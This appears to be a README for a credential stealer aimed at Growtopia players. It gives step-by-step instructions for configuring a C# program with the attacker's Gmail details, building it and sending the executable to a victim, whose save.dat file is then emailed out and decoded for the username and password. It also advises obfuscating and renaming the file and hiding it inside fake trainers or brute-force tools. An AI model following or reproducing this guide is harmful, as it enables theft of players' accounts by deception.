# _Save Stealer_
A program that allows you to send you the victim's save.dat in Growtopia.

* Do _extract to folder ..._ while extracting the .ZIP file

## **Do these steps before running the program**

* Open the (That you use for sending the save.dat file) _gmail_'s **Security** part. [Here](https://myaccount.google.com/security "Google Search")
* Scroll down until you see _Less secure app access_.
* Click to the button and open it.
* If theres a Save Button, then click to the Save Button.

### _Picture of the last step_
![Pic1](https://www.linkpicture.com/q/asddsa.png)

## Getting ready for debugging
1. Install Visual Studio C# 2019 if you dont have. (Can find tutorials on [Youtube](https://www.youtube.com/ "Google Search"))
    * [Example tutorial](https://www.youtube.com/watch?v=Bu26MZAv12E "Google Search")
2. Right click to the _main stealer.sln_ file and open it with **Visual Studio**
3. After opening the file press Ctrl+Alt+L and open _Solution Navigator_
4. Find _Program.cs_ in the Solution Navigator
5. Double click and open it
6. Change the mail parts

## Debugging
1. Set build to Debug x64 (x64 is not necessarily)
2. Build the project (If you don't build it then next step won't work)

## Sending .exe file to the victim
1. Open the **_main stealer_** folder
2. Open the _Bin_ folder and then open the _Debug_ folder
3. You will see _main stealer.exe_ file
4. Send it to the victim
5. When the victim opens it, victim's save.dat file will automatically will send to the mail that you wrote in the code
6. Use save.dat decoder to get _GrowID_ and _Password_
7. You can search [save.dat decoder](https://www.google.com/search?q=save.dat+decoder "Google Search") at Google to find a decoder

## Important
* Use .net obfuscator so the victim won't be able to access your gmail and password
* Change the .exe file's name so the victim won't understand that this is a stealer.
* If you are going to send the .exe file with combining the code with something else (like fake brute force, trainer etc.), then copy the code part in main in Program.cs and paste it in your code (It will only work if you wrote the code that you want to combine the stealer with in C#)

## NOTE
* I do not encourage you to use this program.
* Any problem that may happen to you due to using this program is your own.
